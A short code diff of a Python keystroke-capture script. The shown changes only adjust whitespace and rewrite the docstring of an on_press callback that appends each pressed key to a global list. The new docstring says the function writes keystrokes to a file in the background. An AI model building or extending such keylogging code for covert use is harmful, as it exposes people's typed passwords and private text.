@@ -4,11 +4,11 @@ import datetime
 import time
 
 unix_time = int(time.mktime(datetime.datetime.now().timetuple()))
-
 count, keys = 0, []
 
+
 def on_press(key):
-    """Reset the `count` to zero, and transfer the data in `keys` while clearing the list."""
+    """Worker function to write keystrokes to a file in the background."""
     global keys, count
     keys.append(key)
     count += 1
